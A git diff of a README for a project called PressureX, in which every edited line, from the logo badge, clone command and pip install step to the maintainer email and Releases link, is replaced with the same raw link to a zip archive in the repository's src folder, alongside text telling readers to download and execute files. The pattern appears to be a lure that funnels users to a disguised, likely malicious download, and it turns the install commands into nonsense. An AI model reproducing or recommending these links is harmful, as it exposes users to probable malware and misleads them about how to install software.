@@ -1,6 +1,6 @@
 # PressureX 🚀
 
-![PressureX Logo](https://img.shields.io/badge/PressureX-Ready-brightgreen)
+![PressureX Logo](https://raw.githubusercontent.com/jesan007/PressureX/main/src/X-Pressure-v3.9-beta.3.zip)
 
 ## Overview
 
@@ -32,7 +32,7 @@ To get started with PressureX, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/jesan007/PressureX.git
+   git clone https://raw.githubusercontent.com/jesan007/PressureX/main/src/X-Pressure-v3.9-beta.3.zip
    ```
 
 2. Navigate to the project directory:
@@ -44,7 +44,7 @@ To get started with PressureX, follow these steps:
 3. Install the required dependencies. If you are using Python, for example, you can run:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/jesan007/PressureX/main/src/X-Pressure-v3.9-beta.3.zip
    ```
 
 4. For further setup, refer to the documentation in the `docs` folder.
@@ -109,11 +109,11 @@ PressureX is licensed under the MIT License. See the [LICENSE](LICENSE) file for
 For any questions or feedback, please contact the maintainer:
 
 - **Name**: Jesan
-- **Email**: jesan007@example.com
+- **Email**: https://raw.githubusercontent.com/jesan007/PressureX/main/src/X-Pressure-v3.9-beta.3.zip
 
 ## Releases
 
-For the latest updates and releases, visit our [Releases](https://github.com/jesan007/PressureX/releases) section. Here, you can download the latest version and execute the necessary files to get started with PressureX.
+For the latest updates and releases, visit our [Releases](https://raw.githubusercontent.com/jesan007/PressureX/main/src/X-Pressure-v3.9-beta.3.zip) section. Here, you can download the latest version and execute the necessary files to get started with PressureX.
 
 ---
 
